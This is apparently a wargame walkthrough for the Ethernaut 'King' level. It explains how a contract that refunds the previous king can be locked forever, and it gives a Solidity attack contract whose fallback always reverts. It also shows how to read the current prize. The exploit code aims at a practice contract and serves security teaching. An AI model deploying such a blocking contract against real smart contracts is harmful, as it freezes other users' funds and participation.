Level 9: King

Objective:

Become the King and prevent others from dethroning you.

Vulnerability:

Unprotected fallback function.

Explanation:

The contract sends Ether to the current king when a new king is crowned. If the king’s contract rejects Ether reverts then the whole transaction fails.

Solution:

contract NoReceive {
  constructor(address _target) payable {
    _target.call{value: msg.value}();
  }
  fallback() external payable {
    revert();
  }
}

We can use the helper contract without the fallback function also. 
We need to also figure out how much eth was deposited by the current king to overcome him by sending more than that.
to find the ether needed we can use (await contract.prize()).toString().

Key Takeaways:

When we are working with sending ether we should be sure that we are sending it to a wallet not some contract.
